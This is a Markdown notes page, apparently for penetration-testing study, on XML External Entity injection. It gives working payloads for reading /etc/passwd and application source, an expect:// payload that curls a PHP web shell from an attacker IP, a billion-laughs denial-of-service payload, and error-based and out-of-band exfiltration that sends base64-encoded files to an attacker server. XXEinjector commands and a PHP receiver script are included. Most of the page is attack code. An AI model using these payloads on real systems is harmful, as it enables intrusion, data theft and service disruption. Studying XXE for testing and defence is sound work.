---
layout: default
title: XXE
permalink: /Web/xxe/
---

# XML External Entity (XXE) Injection
XXE Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.

## Local File Disclosure
When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.

### Identifying
If we intercept an HTTP request and our data is send in an XML format to the web server, then it is a potential target. If the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files. <br>
If we send a request and one element is displayed back to us, we can try to inject into that element. We can add e.g. the following lines after the first line the int XML input (the first line should look something like this: `<?xml version="1.0" encoding="UTF-8"?>`):
```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
*Note: In this example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the DOCTYPE was already declared in the XML request, we would just add the ENTITY element to it.*

Now, we should have a new XML entity called 'company', which we can reference with `&company;`. So, instead of using e.g. our email in the email element, we can try using `&company;`, and see whether it will be replaced with the value we defined ('Inlane Freight'):

*Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.*

### Reading Files
To see if we can define external XML entities, we can add the SYSTEM keyword and define the external reference path after it:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an id_rsa SSH key of a specific user, which may grant us access to the back-end server.

*Note: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.*

### Reading Source Code
This would allow us to perform a Whitebox Penetration Test to unveil more vulnerabilities in the web application, or reveal secret configurations like database passwords or API keys. <br>
If the file we are referencing is not in a proper XML format, it fails to be referenced as an external XML entity, so this one probably fails:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file://index.php">
]>
```
If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format. <br>
However, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using file:// as our reference, we will use PHP's php://filter/ wrapper. With this filter, we can specify the convert.base64-encode encoder as our filter, and then add an input resource (e.g. resource=index.php), as follows:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
*Note: This trick only works with PHP web applications.*

### Remote Code Execution with XXE
The easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the PHP://expect filter, though this requires the PHP expect module to be installed and enabled. <br>
The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:
```
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
```
```
sudo python3 -m http.server 80
```
Now, we can use the following XML code to execute a curl command that downloads our web shell into the remote server:
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
*Note: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.*

### Other XXE Attacks
- SSRF exploitation via XXE to enumerate locally open ports and access their pages, among other restricted web pages.
- Denial of Service (DOS) to the hosting web server, with the use the following payload:
  ```
  <?xml version="1.0"?>
  <!DOCTYPE email [
    <!ENTITY a0 "DOS" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
    <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
    <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
    <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
    <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
    <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
    <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
  ]>
  <root>
  <name></name>
  <tel></tel>
  <email>&a10;</email>
  <message></message>
  </root>
  ```
  This payload defines the a0 entity as DOS, references it in a1 multiple times, references a1 in a2, and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference.

 ## File Disclosure

 ### CDATA
 To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
 We can define a begin internal entity with `<![CDATA[`, an end internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:
 ```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
After that, if we could reference the `&joined;` entity, but this probably won't work, since XML prevents joining internal and external entities.
To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined.
Host this file in a DTD (e.g. xxe.dtd):
```
<!ENTITY joined "%begin;%file;%end;">
```
We can use `python3 -m http.server 8000` as usual.
Then reference it as an external entitiy on the target web applicaiton:
```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
### Error Based XXE
The web application might not write any output. However, if the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. <br>
We can try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. <roo> instead of <root>), or just reference a non-existing entity, like `<email>&nonExistent;</email>`.
If it diplays error, we can try creating this payload on our attacking machine:
```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
and then call this in the request:
```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
### Blind Data Exfiltration

#### Out-of-band Data Exfiltration
If we have no way to have anything printed on the web application response, we can try to make the web application send a web request to our web server with the content of the file we are reading. To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
When the XML tries to reference the external oob parameter from our machine, it will request `http://OUR_IP:8000/?content=<base64_encoded_content>` and we can decode the content value. <br>
We can even write a simple PHP script that automatically does that. Put this into `index.php`:
```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
and start PHPH server:
```
php -S 0.0.0.0:8000
```
Then we can initiate our attack with a payload like this:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
*Note: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.*

#### Automated OOB Exfiltration
 we can automate the process of blind XXE data exfiltration with tools like [XXEinjector](https://github.com/enjoiz/XXEinjector).
 1. Clone the repository:
    ```
    git clone https://github.com/enjoiz/XXEinjector.git
    ```
2. Copy the HTTP request from Burp and write it to a file for the tool to use, like:
   ```
   POST /blind/submitDetails.php HTTP/1.1
   Host: 10.129.201.94
   Content-Length: 169
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
   Content-Type: text/plain;charset=UTF-8
   Accept: */*
   Origin: http://10.129.201.94
   Referer: http://10.129.201.94/blind/
   Accept-Encoding: gzip, deflate
   Accept-Language: en-US,en;q=0.9
   Connection: close

   <?xml version="1.0" encoding="UTF-8"?>
   XXEINJECT
   ```
3. Run the tool:
   ```
   ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
   ```
4. The tool might not directly print the data, because we are base64 encoding it. In any case, all exfiltrated files get stored in the Logs folder under the tool, and we can find our file there:
   ```
   cat Logs/10.129.201.94/etc/passwd.log
   ```


